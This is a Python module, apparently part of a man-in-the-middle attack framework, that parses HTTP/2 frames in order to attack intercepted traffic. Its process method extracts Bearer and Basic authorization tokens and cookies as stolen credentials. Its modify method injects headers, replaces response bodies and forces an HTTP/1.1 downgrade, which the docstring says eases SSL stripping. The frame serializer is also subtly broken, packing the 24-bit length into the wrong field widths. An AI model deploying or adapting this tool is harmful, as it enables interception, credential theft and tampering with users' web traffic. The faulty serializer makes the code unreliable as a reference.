"""
HTTP/2 Protocol Handler

Implements binary frame parsing, HPACK decompression, and attack capabilities:
- Header injection
- Stream hijacking
- HTTP/1.1 downgrade forcing
- Response modification

HTTP/2 Frame Format (RFC 7540):
+-----------------------------------------------+
|                 Length (24)                   |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+-------------------------------+
|R|                 Stream Identifier (31)                      |
+=+=============================================================+
|                   Frame Payload (0...)                      ...
+---------------------------------------------------------------+
"""

from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass
import struct

from modules.protocols.base_handler import ProtocolHandler, ProtocolType, ProcessingResult

@dataclass
class HTTP2Frame:
    """HTTP/2 frame structure"""
    length: int
    frame_type: int
    flags: int
    stream_id: int
    payload: bytes
    
    # Frame types (RFC 7540)
    TYPE_DATA = 0x0
    TYPE_HEADERS = 0x1
    TYPE_PRIORITY = 0x2
    TYPE_RST_STREAM = 0x3
    TYPE_SETTINGS = 0x4
    TYPE_PUSH_PROMISE = 0x5
    TYPE_PING = 0x6
    TYPE_GOAWAY = 0x7
    TYPE_WINDOW_UPDATE = 0x8
    TYPE_CONTINUATION = 0x9
    
    def to_bytes(self) -> bytes:
        """Serialize frame to wire format"""
        header = struct.pack(
            '!IBBBI',
            self.length >> 8,  # High 16 bits of length
            self.length & 0xFF,  # Low 8 bits of length
            self.frame_type,
            self.flags,
            self.stream_id & 0x7FFFFFFF  # Mask reserved bit
        )
        return header[:9] + self.payload


class HTTP2Handler(ProtocolHandler):
    """
    HTTP/2 frame manipulation handler.
    
    Attack Capabilities:
    1. Force HTTP/1.1 downgrade (disable ALPN)
    2. Inject malicious headers
    3. Hijack streams
    4. Modify responses
    """
    
    # HTTP/2 connection preface
    CONNECTION_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    
    def __init__(self):
        super().__init__("HTTP/2", ProtocolType.WEB)
        self.hpack_decoder = None
        self.hpack_encoder = None
        
        try:
            import hpack
            self.hpack_decoder = hpack.Decoder()
            self.hpack_encoder = hpack.Encoder()
        except ImportError:
            print("[HTTP/2] Warning: hpack library not installed")
            print("[HTTP/2] Install with: pip install hpack")
    
    def detect(self, packet: bytes) -> bool:
        """
        Detect HTTP/2 traffic.
        
        Checks for:
        - HTTP/2 connection preface
        - Valid frame header
        - ALPN h2/h2c in TLS
        """
        # Check for connection preface
        if packet.startswith(self.CONNECTION_PREFACE):
            return True
        
        # Check for valid frame header (at least 9 bytes)
        if len(packet) < 9:
            return False
        
        try:
            frame = self._parse_frame(packet)
            # Validate frame type
            if 0 <= frame.frame_type <= 9:
                return True
        except:
            pass
        
        return False
    
    def process(self, packet: bytes) -> ProcessingResult:
        """
        Process HTTP/2 packet and extract intelligence.
        
        Extracts:
        - Headers (authority, path, cookies, authorization)
        - Stream IDs
        - Frame types
        """
        try:
            frame = self._parse_frame(packet)
            
            metadata = {
                'frame_type': frame.frame_type,
                'stream_id': frame.stream_id,
                'flags': frame.flags
            }
            
            # Extract headers from HEADERS frame
            if frame.frame_type == HTTP2Frame.TYPE_HEADERS:
                headers = self._decode_headers(frame.payload)
                
                # Extract credentials from headers
                credentials = {}
                tokens = {}
                
                for name, value in headers:
                    name_lower = name.lower()
                    
                    if name_lower == 'authorization':
                        # Extract auth token
                        if value.startswith('Bearer '):
                            tokens['bearer'] = value[7:]
                        elif value.startswith('Basic '):
                            tokens['basic'] = value[6:]
                        credentials['authorization'] = value
                    
                    elif name_lower == 'cookie':
                        tokens['cookie'] = value
                    
                    elif name_lower in [':authority', ':path', ':method']:
                        metadata[name_lower[1:]] = value
                
                return ProcessingResult(
                    protocol_name=self.name,
                    success=True,
                    credentials=credentials if credentials else None,
                    tokens=tokens if tokens else None,
                    metadata=metadata
                )
            
            # DATA frames might contain POST data
            elif frame.frame_type == HTTP2Frame.TYPE_DATA:
                metadata['data_length'] = frame.length
                
            return ProcessingResult(
                protocol_name=self.name,
                success=True,
                metadata=metadata
            )
            
        except Exception as e:
            return ProcessingResult(
                protocol_name=self.name,
                success=False,
                error=str(e)
            )
    
    def modify(self, packet: bytes, rules: Dict[str, Any]) -> Optional[bytes]:
        """
        Modify HTTP/2 packet according to attack rules.
        
        Supported rules:
        - inject_header: Dict[str, str] - Add headers
        - force_http1: bool - Downgrade to HTTP/1.1
        - modify_response: bytes - Replace response data
        """
        try:
            # Force HTTP/1.1 downgrade
            if rules.get('force_http1'):
                return self._downgrade_to_http1(packet)
            
            frame = self._parse_frame(packet)
            
            # Inject headers
            if 'inject_header' in rules and frame.frame_type == HTTP2Frame.TYPE_HEADERS:
                return self._inject_headers(frame, rules['inject_header'])
            
            # Modify response data
            if 'modify_response' in rules and frame.frame_type == HTTP2Frame.TYPE_DATA:
                frame.payload = rules['modify_response']
                frame.length = len(frame.payload)
                return frame.to_bytes()
            
            return None
            
        except Exception as e:
            print(f"[HTTP/2] Modification error: {e}")
            return None
    
    def _parse_frame(self, data: bytes) -> HTTP2Frame:
        """Parse HTTP/2 frame from bytes"""
        if len(data) < 9:
            raise ValueError("Insufficient data for frame header")
        
        # Parse 9-byte header
        length = (data[0] << 16) | (data[1] << 8) | data[2]
        frame_type = data[3]
        flags = data[4]
        stream_id = struct.unpack('!I', data[5:9])[0] & 0x7FFFFFFF
        
        # Extract payload
        payload = data[9:9+length] if len(data) >= 9 + length else data[9:]
        
        return HTTP2Frame(
            length=length,
            frame_type=frame_type,
            flags=flags,
            stream_id=stream_id,
            payload=payload
        )
    
    def _decode_headers(self, payload: bytes) -> List[Tuple[str, str]]:
        """Decode HPACK compressed headers"""
        if not self.hpack_decoder:
            return []
        
        try:
            # Skip padding if present
            headers = self.hpack_decoder.decode(payload)
            return headers
        except Exception as e:
            print(f"[HTTP/2] HPACK decode error: {e}")
            return []
    
    def _inject_headers(self, frame: HTTP2Frame, headers: Dict[str, str]) -> bytes:
        """Inject additional headers into HEADERS frame"""
        if not self.hpack_encoder:
            return frame.to_bytes()
        
        try:
            # Decode existing headers
            existing_headers = self._decode_headers(frame.payload)
            
            # Add new headers
            new_headers = existing_headers + list(headers.items())
            
            # Re-encode with HPACK
            new_payload = self.hpack_encoder.encode(new_headers)
            
            # Create new frame
            modified_frame = HTTP2Frame(
                length=len(new_payload),
                frame_type=frame.frame_type,
                flags=frame.flags,
                stream_id=frame.stream_id,
                payload=new_payload
            )
            
            return modified_frame.to_bytes()
            
        except Exception as e:
            print(f"[HTTP/2] Header injection error: {e}")
            return frame.to_bytes()
    
    def _downgrade_to_http1(self, packet: bytes) -> bytes:
        """
        Convert HTTP/2 request to HTTP/1.1.
        
        This forces clients to use HTTP/1.1, making SSL Strip easier.
        """
        try:
            frame = self._parse_frame(packet)
            
            if frame.frame_type != HTTP2Frame.TYPE_HEADERS:
                return packet
            
            headers = self._decode_headers(frame.payload)
            
            # Extract pseudo-headers
            method = None
            path = None
            authority = None
            
            regular_headers = []
            
            for name, value in headers:
                if name == ':method':
                    method = value
                elif name == ':path':
                    path = value
                elif name == ':authority':
                    authority = value
                elif not name.startswith(':'):
                    regular_headers.append((name, value))
            
            # Construct HTTP/1.1 request
            http1_request = f"{method} {path} HTTP/1.1\r\n"
            http1_request += f"Host: {authority}\r\n"
            
            for name, value in regular_headers:
                http1_request += f"{name}: {value}\r\n"
            
            http1_request += "\r\n"
            
            return http1_request.encode()
            
        except Exception as e:
            print(f"[HTTP/2] Downgrade error: {e}")
            return packet
    
    def create_settings_frame(self, settings: Dict[int, int]) -> bytes:
        """Create SETTINGS frame for h2 negotiation"""
        payload = b''
        for key, value in settings.items():
            payload += struct.pack('!HI', key, value)
        
        frame = HTTP2Frame(
            length=len(payload),
            frame_type=HTTP2Frame.TYPE_SETTINGS,
            flags=0,
            stream_id=0,  # SETTINGS always on stream 0
            payload=payload
        )
        
        return frame.to_bytes()
